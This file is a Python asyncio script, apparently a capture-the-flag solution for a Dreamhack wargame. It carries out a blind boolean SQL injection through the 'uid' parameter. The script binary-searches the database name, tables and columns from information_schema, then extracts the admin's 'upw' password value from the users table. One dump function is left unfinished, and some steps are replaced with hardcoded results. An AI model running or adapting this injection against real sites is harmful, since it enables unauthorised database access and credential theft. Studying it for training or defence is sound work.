import aiohttp
import asyncio

host = 'http://host3.dreamhack.games:15950/'

def check(result):
    return 'exists' in result

queue = asyncio.Queue()

def to_utf_8(uni):
    if(uni < 128):
        return uni
    elif (uni < 0x800):
        return 0xc080 +  ((uni << 2) & 0x1f00)  + (uni & 0x3f)
    else:
        return 0xe08080 + ((uni << 4) & 0xf0000) + ((uni << 2) & 0x3f00) + (uni & 0x3f)

    
async def vector(data, para, target, low, high):

    q = await queue.get()
    async with aiohttp.ClientSession() as session:
        while(low +1 < high):
            mid = (low + high) // 2
            dd = data.copy()
            mmid = to_utf_8(mid)
            dd[para] = dd[para] + f"' and {target} < {mmid} and '1'='1"
            async with session.get(host, params= dd) as resp:
                result = await resp.text()
                if(not check(result)):
                    low = mid
                else:
                    high = mid

    await queue.put(q)
    return low


async def get_str(data, para, target):
    length = await vector(data, para, f'length({target})',1, 100)
    name = ['*'] * length
    tasks = []

    for i in range(length):
        dd = data.copy()
        target2 = f'ascii(substr({target}, {i+1}, 1))'
        tasks.append(asyncio.create_task(vector(dd, para, target2, 0, 200)))

    for i in range(length):
        name[i] = chr(await tasks[i])

    return ''.join(name)

async def get_utf_str(data, para, target):
    length = await vector(data, para, f'CHAR_LENGTH({target})',1, 100)
    name = ['*'] * length
    tasks = []

    for i in range(length):
        dd = data.copy()
        target2 = f'ord(substr({target}, {i+1}, 1))'
        tasks.append(asyncio.create_task(vector(dd, para, target2, 0, 0x10000)))

    for i in range(length):
        name[i] = chr(await tasks[i])

    return ''.join(name)

async def get_db_name(data, para): # db 이름 알아내기
    name = await get_str(data, para, '(SELECT database())')
    return name

async def table_names(data, para, db_name): # 테아블 목록 확인
    target = f'(SELECT count(table_name) FROM information_schema.tables where table_schema = \'{db_name}\')'
    table_num = await vector(data, para, target, 1, 100 )
    tasks = []
    for i in range(table_num):
        target2 = f"(select table_name from information_schema.tables where table_schema = '{db_name}' limit 1 offset {i})"
        tasks.append(asyncio.create_task(get_str(data, para, target2)))
    
    tables = []
    for i in range(table_num):
        tables.append(await tasks[i])
        
    return tables

async def col_names(data, para, table_name, db_name =''): #칼럼 이름과 데이터 타입 확인
    with_db = f"and table_schema = '{db_name}'" if db_name else ""
    target = f"(SELECT count(column_name) from information_schema.columns WHERE table_name = '{table_name}' {with_db})"
        
    col_num = await vector(data, para, target, 1, 100)
    tasks = []
    for i in range(col_num):
        target2 = f"(SELECT concat(column_name, ',' ,data_type) from information_schema.columns WHERE table_name = '{table_name}' {with_db} limit 1 offset {i})"
        tasks.append(asyncio.create_task(get_str(data, para, target2)))
        
    columns = []
    for i in range(col_num):
        columns.append((await tasks[i]).split(','))
        
    return columns

async def get_data(data, para, column, table_name, index, offset):
    target = f"(select convert({column[0]}, char) from {table_name} order by {index} limit 1 offset {offset})"
    result = await get_utf_str(data, para, target)
    return result

async def table_dump(data, para, column, table_name, db_name =''):
    table_name = f"{db_name}.{table_name}" if db_name else table_name
    target = f"(select count(*) from {table_name})"
    row_num = await vector(data, para, target, 1, 100)
    
    tasks = []
    
async def main():
    for i in range(10):
        await queue.put(1)
    data = {'uid':'admin'}

		# 데이터베이스 이름
    print("get current database ...")
    # db_name = await get_db_name(data, 'uid')
    db_name = "user_db"
    print(f"db name is: {db_name}\n\n")
    
    
		# 데이터베이스 내 테이블 목록
    print(f"listing table ...")
    #tables = await table_names(data,'uid',db_name)
    tables = ['users']
    print(f"find {len(tables)}")
    for t in tables:
        print(t)
    
	# users 테이블의 column 목록
    print(f"\n\nlisting column ...")
    # columns = await col_names(data,'uid', 'users')
    columns = [['idx', 'int'], ['uid', 'varchar'], ['upw', 'varchar']]
    print(f"find {len(columns)} columns")
    for c in columns:
        print(f"name: {c[0]}")
        print(f"data type: {c[1]}")
    
    
	# dump table
    result = await get_data(data=data, para='uid', column=['upw', 'varchar'], index='idx', table_name='users', offset=0)
    print(result)
    temp = 0

asyncio.run(main())
